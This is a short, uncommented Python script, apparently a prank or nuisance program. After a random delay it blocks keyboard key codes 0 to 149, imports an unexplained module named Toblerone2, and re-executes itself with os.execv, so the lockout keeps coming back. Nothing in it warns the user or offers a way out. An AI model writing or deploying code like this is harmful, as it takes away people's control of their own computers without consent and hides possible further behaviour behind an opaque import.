import random, time, os, subprocess, sys, keyboard
list1 = [15, 30, 45, 60, 360, 120, 21, 49, 63, 246]
print(random.choice(list1))
time.sleep(random.choice(list1))
for i in range(150):
    keyboard.block_key(i)
import Toblerone2
os.execv(sys.argv[0], sys.argv)
